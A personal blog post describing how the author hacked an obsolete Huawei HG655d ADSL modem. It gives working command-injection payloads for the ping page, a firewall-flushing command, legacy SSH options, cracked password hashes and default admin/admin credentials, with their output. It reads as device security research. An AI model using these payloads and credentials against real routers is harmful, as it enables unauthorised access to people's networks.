---
layout: post
title: "Hacking the Huawei HG655d"
thumbnail: todo-240.jpg
date: 2018-02-28
---



The Huawei HG655d is an obsolete ADSL modem.

## Command injection in ping

The modem's web interface has the functionality to ping IP addresses. This is a feature that is commonly vulnerable to command injection, as the entered IP address is copied into a command as argument to `ping`. The page that handles this request is conveniently named `executecmd.cgi`, and the response includes the output from the ping command:

    var PingResult = "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n" + "64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.485 ms\n" + "64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.332 ms\n" + "64 bytes from 127.0.0.1: seq=2 ttl=64 time=0.338 ms\n" + "64 bytes from 127.0.0.1: seq=3 ttl=64 time=0.332 ms\n" + "\n" + "--- 127.0.0.1 ping statistics ---\n" + "4 packets transmitted, 4 packets received, 0% packet loss\n" + "round-trip min/avg/max = 0.332/0.371/0.485 ms\n" + "";

First, I tried the payload `127.0.0.1;ls`. This fails, but only after a couple of seconds. This seems to indicate that our payload wasn't caught by any input validation, but rather interfered with the ping command. The payload `--help` doesn't give us the help text for ping. However, the payload `-c 1 127.0.0.1` correctly pings. After some tries, the payload `127.0.0.1;echo` gives an interesting result:

    var PingResult = "-c 4\n" + "";

This seem to be the remaining arguments to ping. The page runs `ping $INPUT -c 4`. Our payload ran `ping 127.0.0.1; echo -c 4`, which gave us `-c 4` in the PingResult. We can use this to run arbitrary commands. Let's try the payload `;echo $(ls)`:

    var PingResult = "var usr tmp sbin proc mnt linuxrc lib etc dev bin -c 4\n" + "";

This works.

## Logging in over SSH

Nmap gave the following result:

    Starting Nmap 7.50 ( https://nmap.org ) at 2017-10-09 16:43 CEST
    Nmap scan report for 192.168.40.1
    Host is up (0.012s latency).
    Not shown: 996 closed ports
    PORT    STATE    SERVICE
    22/tcp  filtered ssh
    23/tcp  open     telnet
    80/tcp  open     http
    443/tcp open     https

    Nmap done: 1 IP address (1 host up) scanned in 2.66 seconds

It seems that there is an SSH service, but it is filtered by the firewall. We can confirm that by running `netstat -l` using our command injection. That indeed shows something running on port 22. We can now also use the command injection to disable the firewall. By running `iptables -F INPUT` we flush all firewall rules and the SSH port is now exposed.

    # ssh root@192.168.40.1
    Unable to negotiate with 192.168.40.1 port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1

However, it runs some old version of SSH and uses old algorithms that are disabled in modern versions. We can explicitly enable them in the client:

    # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc root@192.168.40.1
    root@192.168.40.1's password: 
    Permission denied, please try again.

So now we can connect with SSH but we don't know the password.

## Cracking the password

Using our command injection, we retrieve `/etc/passwd`:

    0:Eh/.Fe0Q0yDIc:0:0:root:/home:/bin/sh
    ftp:B6GbxkUCDwEx2:0:0:ftp user:/mnt:/bin/sh

Two users. The root user seems to be called `0` instead of `root`, and the user `ftp` also seems to have user ID 0. Let's try to crack the passwords:

    $ cudaHashcat64.bin hg655d.txt weakpass.lst -m 1500
    ...
    B6GbxkUCDwEx2:
    Eh/.Fe0Q0yDIc:root
    
The ftp user has an empty password, and the root user has "root" as password. I already tried those passwords, and SSH won't give access. Maybe it is configured to deny password logins, or it is some embedded SSH server that doesn't work the way I assume it does.

After a quick search, I found credentials for [another modem](https://www.exploit-db.com/exploits/38663/): admin/admin. This works, but doesn't give a Linux shell:

    # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=3des-cbc admin@192.168.40.1
    admin@192.168.40.1's password: admin
    -------------------------------
    -----Welcome to ATP Cli------
    -------------------------------
    ATP>shell
    shell
    ATP>ls
    ls
    Command failed.
    ATP>
